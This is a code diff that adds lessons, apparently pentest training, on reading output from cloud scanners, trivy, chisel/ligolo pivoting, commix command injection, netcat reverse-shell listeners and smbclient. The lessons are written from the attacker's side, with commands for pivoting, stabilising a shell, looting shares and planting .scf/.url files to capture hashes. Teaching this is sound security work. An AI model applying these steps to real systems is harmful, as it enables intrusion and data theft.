@@ -60,6 +60,9 @@ _ALIASES = {
     "office2john": "keepass2john", "pdf2john": "keepass2john", "2john": "keepass2john",
     "wifite2": "wifite", "hcxpcapngtool": "hcxdumptool", "hcxtools": "hcxdumptool",
     "trufflehog": "gitleaks", "paramspider": "arjun",
+    "prowler": "scoutsuite", "scout": "scoutsuite", "cloudsploit": "scoutsuite",
+    "grype": "trivy", "ligolo": "chisel", "ligolo-ng": "chisel", "sshuttle": "chisel",
+    "nc": "netcat", "ncat": "netcat", "pwncat": "netcat", "smbget": "smbclient",
 }
 
 
@@ -2814,6 +2817,305 @@ OUTPUT_LESSONS.update({
             "Document metadata leaks USERNAMES (Author field) — harvest them across files for your user list.",
             "Software versions in metadata (e.g. Acrobat 9.0) reveal outdated, potentially vulnerable client software.",
             "Photos can carry GPS coordinates — real physical-location intel; strip metadata from your own files too.",
+        ],
+    },
+})
+
+
+# ── Batch 10: cloud + container + pivoting + injection + shells + SMB ───────
+OUTPUT_LESSONS.update({
+
+    "scoutsuite": {
+        "tool": "ScoutSuite / Prowler",
+        "headline": "Cloud posture scanners rank misconfigurations by severity. Two findings end accounts: public data stores and over-privileged IAM with no MFA. Hit those before the noise.",
+        "sample": (
+            "$ scout aws\n"
+            "Danger   S3 bucket 'corp-backups' allows public READ\n"
+            "Danger   IAM user 'deploy' has AdministratorAccess, MFA not enabled\n"
+            "Warning  Security group sg-123 allows 0.0.0.0/0 on port 22\n"
+            "Warning  RDS instance 'prod-db' is publicly accessible\n"
+            "Info     CloudTrail logging enabled"
+        ),
+        "reading": [
+            {"field": "Danger vs Warning vs Info",
+             "means": "Severity ranking of each misconfiguration — the scanner already triaged for you.",
+             "do": "Work Danger first. Info is often good hygiene (logging on), not a finding — don't chase it."},
+            {"field": "S3 bucket allows public READ",
+             "means": "A storage bucket is exposed to the internet — direct data exposure.",
+             "do": "Download it (aws s3 ls/cp with --no-sign-request). 'corp-backups' public = likely the whole crown jewels."},
+            {"field": "IAM user 'deploy' has AdministratorAccess, MFA not enabled",
+             "means": "An over-privileged identity with no second factor.",
+             "do": "The privesc jackpot — compromise 'deploy' (leaked key, weak password) and you own the entire account."},
+            {"field": "Security group 0.0.0.0/0 on port 22 / public RDS",
+             "means": "Services exposed to the whole internet.",
+             "do": "Direct network exposure — SSH open worldwide invites brute force; public RDS invites DB attacks. Verify reachability."},
+        ],
+        "reference": {
+            "title": "Cloud findings, ranked by impact",
+            "rows": [
+                ("public S3/blob/bucket", "data exposure — download it"),
+                ("IAM admin + no MFA", "privesc — own that identity = own account"),
+                ("0.0.0.0/0 security groups", "internet-exposed services"),
+                ("public RDS/DB", "direct database exposure"),
+                ("Info findings", "usually hygiene, not a vuln"),
+            ],
+        },
+        "work_with_it": (
+            "Read a cloud audit as a ranked target list: public data stores you can pull immediately, over-privileged "
+            "IAM identities you can hijack for full control, and internet-exposed services (SSH/RDP/DB). The IAM + "
+            "no-MFA findings are the highest leverage — one leaked key for an admin service account is game over for "
+            "the account. Verify each 'public' finding actually grants you access."
+        ),
+        "misreads": [
+            "Cloud findings are severity-ranked (Danger/Warning) — hit public data + over-privileged IAM first, skip Info.",
+            "An IAM identity with admin rights and no MFA is a privesc jackpot — compromise it and you own the account.",
+            "'Public' S3/RDS/security-group findings are direct exposure, not theoretical — verify and use the access.",
+        ],
+    },
+
+    "trivy": {
+        "tool": "trivy / grype",
+        "headline": "trivy scans container images (and filesystems, IaC) for KNOWN CVEs. Don't drown in the count — a CRITICAL with a public exploit (Log4Shell) is your entry; and check whether the vuln is actually reachable.",
+        "sample": (
+            "$ trivy image myapp:latest\n"
+            "myapp:latest (debian 11.2)  Total: 45 (CRITICAL: 3, HIGH: 12, MEDIUM: 20, LOW: 10)\n"
+            "┌────────────┬────────────────┬──────────┬───────────────┐\n"
+            "│ openssl    │ CVE-2022-3602  │ CRITICAL │ 1.1.1n-0+deb  │\n"
+            "│ log4j-core │ CVE-2021-44228 │ CRITICAL │ 2.16.0        │\n"
+            "│ curl       │ CVE-2021-22947 │ MEDIUM   │ 7.74.0-1.3    │\n"
+            "└────────────┴────────────────┴──────────┴───────────────┘"
+        ),
+        "reading": [
+            {"field": "Total: 45 (CRITICAL: 3, HIGH: 12, ...)",
+             "means": "The severity breakdown — most images have dozens; the count alone is noise.",
+             "do": "Ignore the total; go straight to CRITICAL/HIGH. A wall of MEDIUM/LOW rarely gives you a foothold."},
+            {"field": "log4j-core  CVE-2021-44228  CRITICAL",
+             "means": "A specific vulnerable library — here Log4Shell, a trivially-exploited RCE.",
+             "do": "This is your entry point. Named, exploitable CVEs in a reachable component are the win, not generic package age."},
+            {"field": "Fixed Version: 2.16.0",
+             "means": "A patch exists in that version — the image is running an older, unpatched one.",
+             "do": "Populated = unpatched but fixable (still exploitable NOW). EMPTY 'Fixed Version' = no patch exists yet (0-day-ish)."},
+            {"field": "(implicit) is the component reachable?",
+             "means": "A CVE in the image doesn't mean it's exposed or used at runtime.",
+             "do": "Confirm the vulnerable library is actually invoked/exposed before claiming exploitability — many are dormant."},
+        ],
+        "reference": {
+            "title": "Triage a trivy report",
+            "rows": [
+                ("CRITICAL/HIGH with public PoC", "your entry — start here"),
+                ("Fixed Version populated", "unpatched but fixable — exploitable now"),
+                ("Fixed Version empty", "no patch yet"),
+                ("MEDIUM/LOW bulk", "usually noise for exploitation"),
+                ("reachability", "confirm the vuln component is actually used"),
+            ],
+        },
+        "work_with_it": (
+            "Sort ruthlessly by severity and exploitability: a CRITICAL RCE (Log4Shell, Spring4Shell) in a component "
+            "the app actually exposes is your foothold; the 30 MEDIUM/LOW package-age findings are report filler for "
+            "exploitation purposes. Cross-check each CRITICAL for a public PoC and confirm the library is reachable "
+            "at runtime before betting on it."
+        ),
+        "misreads": [
+            "trivy finds KNOWN CVEs in packages — a CRITICAL with a public exploit is the entry, not the 20 MEDIUMs.",
+            "Empty 'Fixed Version' means no patch exists yet; populated means it's simply unpatched (still exploitable now).",
+            "A CVE in the image isn't automatically reachable — confirm the vulnerable component is actually used/exposed.",
+        ],
+    },
+
+    "chisel": {
+        "tool": "chisel / ligolo-ng",
+        "headline": "These are PIVOTING tools: they turn a compromised host into your router into networks you otherwise can't reach. Read the tunnel as 'the foothold is now my path to the internal subnet'.",
+        "sample": (
+            "# attacker:  chisel server -p 8080 --reverse\n"
+            "# foothold:  chisel client 10.10.14.5:8080 R:socks\n"
+            "server: session#1: tun: proxy#R:127.0.0.1:1080=>socks\n"
+            "# now route tools through it:\n"
+            "$ proxychains nmap -sT 10.0.1.0/24"
+        ),
+        "reading": [
+            {"field": "R:socks (reverse SOCKS)",
+             "means": "A reverse SOCKS proxy — traffic you send flows OUT through the compromised host into its network.",
+             "do": "This is the pivot. Point proxychains at 127.0.0.1:1080 and your tools now reach the foothold's internal subnet."},
+            {"field": "session#1 ... proxy ... =>socks",
+             "means": "The tunnel is established and listening (here on local port 1080).",
+             "do": "Confirmed pivot. Anything through that SOCKS port emerges from inside the target network."},
+            {"field": "proxychains nmap 10.0.1.0/24",
+             "means": "You're now scanning an internal range that was unreachable from your box directly.",
+             "do": "The whole point — enumerate and attack the SECOND network layer via the first compromised host."},
+            {"field": "(ligolo-ng) tun interface instead",
+             "means": "ligolo-ng gives you a real routed tun interface — no proxychains needed.",
+             "do": "Add a route to the internal range and use tools normally (no proxychains prefix) — cleaner for scans."},
+        ],
+        "reference": {
+            "title": "Pivoting concepts",
+            "rows": [
+                ("R:socks", "reverse SOCKS — route out through the foothold"),
+                ("proxychains", "wrap tools to use the SOCKS pivot"),
+                ("ligolo-ng tun", "real route — no proxychains needed"),
+                ("session established", "the tunnel is live — pivot ready"),
+                ("goal", "reach the 2nd-layer internal network"),
+            ],
+        },
+        "work_with_it": (
+            "Once you own a dual-homed host, stand up a pivot so its internal subnet becomes reachable: chisel R:socks "
+            "+ proxychains, or ligolo-ng for a real route (no proxychains). Then re-run your recon (nmap, nxc) against "
+            "the internal range as if you were local. Pivoting is how a single foothold turns into the rest of the "
+            "network — the tunnel output confirms your path in."
+        ),
+        "misreads": [
+            "chisel/ligolo reach INTERNAL networks through a compromised host — the foothold becomes your router (pivoting).",
+            "R:socks = reverse SOCKS; wrap your tools in proxychains to route them through the pivot into unreachable subnets.",
+            "ligolo-ng gives a real tun route — you skip proxychains and use tools normally against the internal range.",
+        ],
+    },
+})
+
+
+# ── Batch 10b: command injection + reverse shells + SMB browsing ───────────
+OUTPUT_LESSONS.update({
+
+    "commix": {
+        "tool": "commix",
+        "headline": "commix finds and exploits OS COMMAND injection (not SQL). Read whether it's results-based (output returns — fast) or blind (inferred — slow), and remember the shell you get runs as the WEB user.",
+        "sample": (
+            "$ commix -u \"http://target/ping?host=127.0.0.1\"\n"
+            "[+] Parameter 'host' is injectable\n"
+            "[+] Type: results-based command injection\n"
+            "[+] Technique: classic injection (results-based)\n"
+            "(os_shell) > id\n"
+            "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+        ),
+        "reading": [
+            {"field": "Parameter 'host' is injectable",
+             "means": "commix confirmed OS-command injection through that input — you can run shell commands on the server.",
+             "do": "This is RCE. Note the parameter; it's your execution channel for a full reverse shell next."},
+            {"field": "Type: results-based vs blind/time-based",
+             "means": "Whether command output comes straight back (results-based, fast) or must be inferred (blind, slow).",
+             "do": "Results-based → interact freely. Blind/time-based → keep commands short and consider going straight for a reverse shell."},
+            {"field": "(os_shell) > id → uid=33(www-data)",
+             "means": "You have a working command shell — running as the WEB server account, not root.",
+             "do": "Confirm context with id/whoami. You're www-data — enumerate for local privesc from here."},
+            {"field": "the input being a 'ping'/host-style param",
+             "means": "Classic injection point — a field that shells out to a system command.",
+             "do": "ping/nslookup/convert/export features are prime command-injection candidates; commix targets them well."},
+        ],
+        "reference": {
+            "title": "Command injection vs SQL injection",
+            "rows": [
+                ("commix", "OS COMMAND injection (run shell commands)"),
+                ("sqlmap", "SQL injection (query the database)"),
+                ("results-based", "output returns directly — fast"),
+                ("blind/time-based", "inferred — slow; go for a reverse shell"),
+                ("shell context", "the WEB user (www-data), not root"),
+            ],
+        },
+        "work_with_it": (
+            "Once commix confirms injection, don't live in its os_shell — upgrade to a real reverse shell (it can drop "
+            "one for you) so you get a stable session. You'll land as the web user (www-data/apache), so pivot straight "
+            "into local privilege escalation (SUID, sudo, kernel). Results-based lets you interact; blind means favour "
+            "fire-and-forget payloads like a reverse shell."
+        ),
+        "misreads": [
+            "commix exploits COMMAND injection (OS commands) — different from sqlmap's SQL injection (database queries).",
+            "Results-based returns output directly (fast); blind/time-based is inferred (slow) — go for a reverse shell.",
+            "The shell runs as the WEB user (www-data), not root — you still need local privesc from there.",
+        ],
+    },
+
+    "netcat": {
+        "tool": "netcat / nc (reverse shell listener)",
+        "headline": "A listener that prints 'connect from [target]' means your reverse shell landed. But a raw nc shell is DUMB — upgrade it to a PTY before Ctrl-C or a typo kills your only foothold.",
+        "sample": (
+            "$ nc -lvnp 4444\n"
+            "listening on [any] 4444 ...\n"
+            "connect to [10.10.14.5] from (UNKNOWN) [10.0.0.5] 49233\n"
+            "$ id\n"
+            "uid=1000(jdoe) gid=1000(jdoe)\n"
+            "$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'   # upgrade to PTY"
+        ),
+        "reading": [
+            {"field": "connect to [10.10.14.5] from ... [10.0.0.5]",
+             "means": "The TARGET (10.0.0.5) connected back to YOUR listener — the reverse shell landed.",
+             "do": "You have a shell. First move: run id/whoami to learn your context, then stabilize it (below)."},
+            {"field": "id → uid=1000(jdoe)",
+             "means": "You landed as whatever account executed the payload — here a normal user, not root.",
+             "do": "Note the privilege level; a user shell means privesc is your next phase, not looting yet."},
+            {"field": "the raw '$' prompt (no colour, no tab-complete)",
+             "means": "This is a DUMB shell — no job control, no history; Ctrl-C kills the whole session, not the command.",
+             "do": "Upgrade it: python pty.spawn → Ctrl-Z → stty raw -echo; fg → export TERM=xterm. Now it behaves like a real terminal."},
+            {"field": "-lvnp 4444",
+             "means": "Listen, verbose, no-DNS, port 4444 — your catch settings.",
+             "do": "Match the LPORT your payload calls back to. 443/80 blend with normal egress better than 4444."},
+        ],
+        "reference": {
+            "title": "Catch it, then stabilize it",
+            "rows": [
+                ("connect from [target]", "the reverse shell landed"),
+                ("id/whoami first", "learn your context/privilege"),
+                ("raw shell = dumb", "no Ctrl-C safety, no tab-complete"),
+                ("pty.spawn + stty raw", "upgrade to a full PTY"),
+                ("LPORT 443/80", "blends with normal egress"),
+            ],
+        },
+        "work_with_it": (
+            "The instant the shell connects, stabilize BEFORE you do anything risky: a stray Ctrl-C on a raw nc shell "
+            "drops your foothold. Spawn a PTY (python/script), background with Ctrl-Z, set stty raw -echo, foreground, "
+            "and export a TERM — now you have arrows, tab-complete, and Ctrl-C safety. Then run id, and move into "
+            "privilege escalation from whatever user you landed as."
+        ),
+        "misreads": [
+            "'connect from [target]' means the reverse shell landed — the target connected back to your listener.",
+            "A raw nc shell is DUMB — upgrade to a PTY (pty.spawn + stty raw) before Ctrl-C kills your only shell.",
+            "You land as whatever ran the payload (often a low-priv/web user), not root — privesc comes next.",
+        ],
+    },
+
+    "smbclient": {
+        "tool": "smbclient",
+        "headline": "smbclient is an interactive FTP-like client for one SMB share you can access. ls to browse, get to download, put to upload — and 'recurse ON' to find files buried deep.",
+        "sample": (
+            "$ smbclient //10.0.0.15/Users -U jdoe\n"
+            "smb: \\> ls\n"
+            "  Documents            D     0  Mon Jun 01 ...\n"
+            "  passwords.txt        A   142  Mon Jun 01 ...\n"
+            "smb: \\> get passwords.txt\n"
+            "getting file passwords.txt of size 142 as passwords.txt\n"
+            "smb: \\> recurse ON; prompt OFF; mget *"
+        ),
+        "reading": [
+            {"field": "smb: \\> prompt",
+             "means": "You're inside a specific share (//host/Users) with access — an interactive session.",
+             "do": "Unlike smbmap (which lists permissions across shares), this is you actually IN one share, browsing it."},
+            {"field": "ls → passwords.txt  A  142",
+             "means": "A directory listing; 'A' = archive (a file), 'D' = directory.",
+             "do": "Scan for the good stuff: passwords/config/backup files, scripts, .kdbx, id_rsa, unattend.xml."},
+            {"field": "get passwords.txt",
+             "means": "Downloading a file from the share to your machine.",
+             "do": "Exfil anything interesting. Use 'get' for one file; set up mget for many."},
+            {"field": "recurse ON; prompt OFF; mget *",
+             "means": "Recurse into subfolders, disable per-file prompts, and grab everything.",
+             "do": "The fast way to loot an entire share — pull it all locally, then grep offline for secrets."},
+        ],
+        "reference": {
+            "title": "smbclient commands",
+            "rows": [
+                ("ls / cd", "browse the share"),
+                ("get / mget", "download one / many files"),
+                ("put", "upload (if the share is writable)"),
+                ("recurse ON; mget *", "loot the whole share"),
+                ("vs smbmap", "smbmap = permissions; smbclient = in-share access"),
+            ],
+        },
+        "work_with_it": (
+            "Use smbclient to actually work a share you can reach (after smbmap tells you which are readable/writable). "
+            "Browse for credential and config files, and when a share looks rich, 'recurse ON; prompt OFF; mget *' to "
+            "pull everything and grep it offline. If the share is WRITABLE, 'put' a malicious .scf/.url to capture "
+            "hashes from anyone who browses it."
+        ),
+        "misreads": [
+            "smbclient is interactive in ONE share (ls/get/put) — smbmap is the tool that maps permissions across shares.",
+            "'recurse ON; prompt OFF; mget *' loots an entire share at once — pull it and grep offline for secrets.",
+            "Writable shares let you 'put' files — drop payloads or SCF/.url files to capture hashes from browsers.",
         ],
     },
 })
